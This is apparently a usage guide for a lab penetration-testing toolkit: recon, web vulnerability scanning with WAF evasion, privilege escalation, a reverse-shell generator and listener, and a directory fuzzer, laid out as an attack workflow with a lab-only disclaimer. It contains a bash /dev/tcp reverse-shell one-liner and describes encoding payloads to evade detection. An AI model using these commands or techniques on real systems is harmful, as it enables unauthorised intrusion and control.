# ⚡ Elite Arsenal — Complete Usage Guide

[← Lab Scripts Home](../lab-scripts/Home.md) | [← Vault Home](../Home.md)

---

## 🔥 Quick Reference

| Tool | Purpose | Command |
|------|---------|---------|
| **Recon Engine** | Full target reconnaissance | `python3 01-recon-engine.py TARGET` |
| **Web Vuln Scanner** | SQLi/XSS/LFI/CMDi/SSRF | `python3 02-web-vuln-scanner.py URL` |
| **Privesc Scanner** | Linux/Windows privilege escalation | `python3 03-privesc-scanner.py` |
| **Exploit Framework** | Shell generation & listener | `python3 04-exploit-framework.py generate -H IP -P PORT` |
| **Dir Fuzzer** | Web content discovery | `python3 05-dir-fuzzer.py URL` |

---

## Tool 01: Elite Recon Engine

### What It Does
Full-spectrum target reconnaissance in 5 phases:
1. **Port Scanning** — Multi-threaded TCP scan with banner grabbing (up to 65535 ports)
2. **Technology Detection** — Fingerprints 25+ technologies (Apache, Nginx, PHP, WordPress, etc.)
3. **SSL/TLS Analysis** — Certificate validation, cipher strength, protocol version
4. **Subdomain Enumeration** — 120+ common subdomain brute-force with DNS resolution
5. **Quick Vulnerability Checks** — Tests 18 common misconfigurations (.env, .git, backup files)

### Usage Examples

```bash
# Quick scan (32 common ports)
python3 01-recon-engine.py 192.168.1.1

# Top 1000 ports with 200 threads
python3 01-recon-engine.py 192.168.1.1 -p top1000 -t 200

# Full 65535 port scan (aggressive)
python3 01-recon-engine.py 192.168.1.1 -p full -t 500

# Include subdomain enumeration
python3 01-recon-engine.py target.lab -s

# Save to specific output file
python3 01-recon-engine.py 10.0.0.1 -o recon-report.json
```

### Output
- Color-coded terminal output with port/service/banner table
- JSON report with all findings
- Missing security headers flagged
- Technology stack identified

---

## Tool 02: Elite Web Vulnerability Scanner

### What It Does
Tests web applications for **6 vulnerability classes** with verification probes:

| Vuln Type | Detection Methods | Verification |
|-----------|------------------|--------------|
| **SQL Injection** | Boolean, Time-based, Error-based, UNION | Response diff + time delay comparison |
| **Cross-Site Scripting** | Reflected, DOM, Event handlers | Payload reflection check |
| **Local File Inclusion** | Path traversal, PHP wrappers, encodings | File content pattern matching |
| **Command Injection** | Arithmetic markers, blind time-based | Output marker verification |
| **SSRF** | Cloud metadata, internal services, IP bypass | Response content analysis |

### Usage Examples

```bash
# Full scan with automatic parameter discovery
python3 02-web-vuln-scanner.py http://192.168.1.1/app

# Scan specific parameters
python3 02-web-vuln-scanner.py http://target/page.php --params id,page,file

# Only test for SQLi and XSS
python3 02-web-vuln-scanner.py http://target/ --scan sqli,xss

# Route traffic through Burp Suite
python3 02-web-vuln-scanner.py http://target/ --proxy http://127.0.0.1:8080

# Authenticated scan with session cookie
python3 02-web-vuln-scanner.py http://target/ --cookie "PHPSESSID=abc123; token=xyz"

# Rate-limited scan (0.5s between requests)
python3 02-web-vuln-scanner.py http://target/ --delay 0.5
```

### WAF Evasion
The scanner includes payloads with built-in WAF bypass techniques:
- MySQL version-conditioned comments (`/*!50000UNION*/`)
- Case alternation (`uNiOn SeLeCt`)
- Double URL encoding (`%252f`)
- HTML entity encoding for XSS
- Base64-encoded eval for XSS
- `$IFS` space bypass for command injection
- Variable concatenation bypass
- PHP wrapper chains for LFI

---

## Tool 03: Elite Privilege Escalation Scanner

### What It Does
Runs on the target system after gaining initial access. Scans for **every common privesc vector**:

#### Linux (12 checks)
| Check | What It Finds |
|-------|---------------|
| SUID/SGID | 30+ GTFOBins-mapped dangerous binaries with ready exploit commands |
| Sudo | Misconfigured sudo rules (NOPASSWD, LD_PRELOAD, dangerous commands) |
| Writable Files | /etc/passwd, /etc/shadow, /etc/sudoers, crontab |
| Cron Jobs | Writable cron scripts (instant root) |
| Capabilities | cap_setuid, cap_sys_admin, cap_dac_override |
| Kernel | DirtyCow, DirtyPipe, known CVEs |
| Network | Internal-only services |
| Docker/LXD | Docker socket, group membership |
| Credentials | SSH keys, .bash_history, wp-config.php |

#### Windows (9 checks)
| Check | What It Finds |
|-------|---------------|
| Unquoted Paths | Service path hijacking |
| AlwaysInstallElevated | MSI privilege escalation |
| AutoLogon | Plaintext registry credentials |
| Stored Creds | cmdkey saved credentials |
| Scheduled Tasks | Writable task binaries |
| Token Privileges | SeImpersonate (Potato), SeBackup, SeDebug |
| Patches | Missing update enumeration |
| Network | Internal listening services |
| Passwords | SAM, web.config, user documents |

### Usage

```bash
# Run on target system (auto-detects OS)
python3 03-privesc-scanner.py

# Output includes ready-to-use exploit commands for every finding
```

---

## Tool 04: Elite Exploit & Shell Framework

### What It Does
Three capabilities in one tool:

#### 1. Shell Generator (22 payloads)
Generates reverse shells in **15 languages** and web shells for **4 platforms**:

| Type | Languages |
|------|-----------|
| **Reverse Shells** | Bash TCP/UDP, Netcat (classic + mkfifo), Python3 (basic + PTY), Python Windows, PHP (exec + proc_open), Perl, Ruby, PowerShell (plain + Base64), Java, Node.js, Socat TLS |
| **Web Shells** | PHP (one-liner + obfuscated), JSP, ASPX |

#### 2. Payload Encoder
Encodes payloads to bypass detection:
- Base64 pipe to bash
- Hex via xxd
- URL encoding
- PowerShell Base64 (UTF-16LE)
- Python exec wrapper

#### 3. Reverse Shell Listener
Built-in TCP listener with interactive shell session.

### Usage Examples

```bash
# Generate ALL shells for your listener
python3 04-exploit-framework.py generate -H 192.168.1.100 -P 4444

# Generate a specific shell type
python3 04-exploit-framework.py generate -H 10.0.0.1 -P 443 -t python3-pty

# Encode a payload in base64
python3 04-exploit-framework.py encode -p "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" -m base64

# Encode for PowerShell
python3 04-exploit-framework.py encode -p "IEX(cmd)" -m powershell-b64

# Start a listener to catch shells
python3 04-exploit-framework.py listen -P 4444

# List all available shell types
python3 04-exploit-framework.py list
```

---

## Tool 05: Elite Directory & Endpoint Fuzzer

### What It Does
Multi-threaded web content discovery with:
- **200+ built-in paths** (admin panels, configs, backups, APIs, debug endpoints)
- **Extension brute-forcing** (.php, .html, .bak, .old, .json, etc.)
- **False positive filtering** (baseline comparison, size/status filtering)
- **Recursive scanning** of discovered directories
- **API endpoint wordlist** for modern applications

### Usage Examples

```bash
# Quick scan with built-in wordlist
python3 05-dir-fuzzer.py http://192.168.1.1/

# Use a custom wordlist (e.g., SecLists)
python3 05-dir-fuzzer.py http://target/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# API endpoint fuzzing
python3 05-dir-fuzzer.py http://target/ -b api -t 50

# Custom extensions
python3 05-dir-fuzzer.py http://target/ -e .php,.html,.bak,.old,.swp

# Recursive mode (scan discovered dirs)
python3 05-dir-fuzzer.py http://target/ -r -t 50

# Through Burp proxy
python3 05-dir-fuzzer.py http://target/ --proxy http://127.0.0.1:8080

# Hide 403 and 301 responses
python3 05-dir-fuzzer.py http://target/ --hide-status 403,301

# Rate-limited for stealth
python3 05-dir-fuzzer.py http://target/ --delay 1 -t 5
```

---

## 🎯 Attack Workflow

Use the tools in this order for a complete penetration test:

```
┌──────────────────────────────────────────────────────────┐
│  Phase 1: RECONNAISSANCE                                 │
│  01-recon-engine.py → Discover ports, services, tech     │
│  05-dir-fuzzer.py   → Find hidden endpoints & files      │
├──────────────────────────────────────────────────────────┤
│  Phase 2: VULNERABILITY SCANNING                         │
│  02-web-vuln-scanner.py → Test for SQLi, XSS, LFI, etc. │
├──────────────────────────────────────────────────────────┤
│  Phase 3: EXPLOITATION                                   │
│  04-exploit-framework.py generate → Create shell payload │
│  04-exploit-framework.py listen   → Catch reverse shell  │
├──────────────────────────────────────────────────────────┤
│  Phase 4: PRIVILEGE ESCALATION                           │
│  03-privesc-scanner.py → Find privesc vectors on target  │
├──────────────────────────────────────────────────────────┤
│  Phase 5: POST-EXPLOITATION                              │
│  07-persistence-kit.py  → Establish persistence          │
│  08-exfil-tester.py     → Test exfil channels            │
│  19-forensic-enumerator → Enumerate forensic artifacts   │
└──────────────────────────────────────────────────────────┘
```

---

## ⚠️ LAB-ONLY Disclaimer

> [!CAUTION]
> Every tool in this arsenal is designed for **authorized lab environments only**. Using these tools against systems without explicit written permission is **illegal** and violates the CEH Code of Ethics. Always ensure you have proper authorization before testing.

---

## 📦 Dependencies

```bash
pip install requests
```

All tools are built using Python standard library + `requests`. No complex dependencies required.
